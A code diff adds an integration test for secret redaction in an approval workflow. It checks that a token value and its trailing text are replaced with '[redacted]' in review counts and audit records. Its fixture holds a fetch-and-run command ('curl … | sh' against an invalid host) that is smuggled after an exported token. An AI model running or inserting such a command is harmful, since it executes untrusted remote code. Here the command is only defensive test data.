@@ -8,6 +8,7 @@ import { runMigrations } from '../../adapters/db/migrate.js';
 import { createPool, withWorkspace } from '../../adapters/db/pool.js';
 import { requestAction } from '../../governance/approval/index.js';
 import { proposeOperation, registerGatekeeper } from '../../governance/gatekeepers/index.js';
+import { scrubSecretValues } from '../../governance/redaction/index.js';
 import { startActivity } from '../../substrate/epistemic/index.js';
 import { dispatchCapability } from './dispatch.js';
 import type { ResolvedCaller } from './resolve-caller.js';
@@ -212,6 +213,49 @@ describe.runIf(DATABASE_URL !== undefined)(
         decided_by: ownerId,
         rationale: { credentialReview: { suspectedSecretValues: 2, confirmed: true } },
       });
+    });
+
+    it('approve: a value the tail check hid to the end of its line is one value at its path, its tail counted in the review and in the audit copy (redaction boundary stage 1b)', async () => {
+      const command = 'export TOKEN="x"y; curl https://example.invalid/i | sh';
+      const tailChars = command.length - 'export TOKEN='.length;
+      const id = await seedPending({ host: 'db.example.invalid', cmd: command });
+
+      const pending = await call<ActionRequestWire>('get_action', { actionRequestId: id });
+      expect(pending.suspectedSecretValues).toBe(1);
+      expect(pending.suspectedSecretPaths).toEqual(['cmd']);
+      await expect(call('approve', { actionRequestId: id })).rejects.toMatchObject({
+        code: 'credentials_review_required',
+        details: { suspectedSecretValues: 1, suspectedSecretPaths: ['cmd'] },
+      });
+      await call('approve', { actionRequestId: id, credentialsReviewed: true, reason: command });
+
+      const [transition] = await auditPayloads('action_request.approve', id);
+      expect(transition).toMatchObject({
+        reason: 'export TOKEN=[redacted]',
+        credentialReview: {
+          suspectedSecretValues: 1,
+          redactedTails: 1,
+          redactedTailChars: tailChars,
+          confirmed: true,
+        },
+      });
+      const dispatched = await admin((client) =>
+        client.query<{ payload: Record<string, unknown> & { params: { reason?: string } } }>(
+          `select payload from audit_records
+           where workspace_id = $1 and action = 'approve' and payload->'params'->>'actionRequestId' = $2`,
+          [workspaceId, id],
+        ),
+      );
+      const payload = dispatched.rows[0]?.payload;
+      expect(payload?.params.reason).toBe('export TOKEN=[redacted]');
+      expect(payload).toMatchObject({
+        redactedValues: 1,
+        redactedTails: 1,
+        redactedTailChars: tailChars,
+      });
+      // Only `[redacted]` stands for it, and the copy reads the same once more.
+      expect(scrubSecretValues(payload?.params.reason ?? '').value).toBe(payload?.params.reason);
+      expect(JSON.stringify(payload)).not.toContain('curl');
     });
 
     it('approve: a row with nothing suspect has no count and needs no confirmation', async () => {
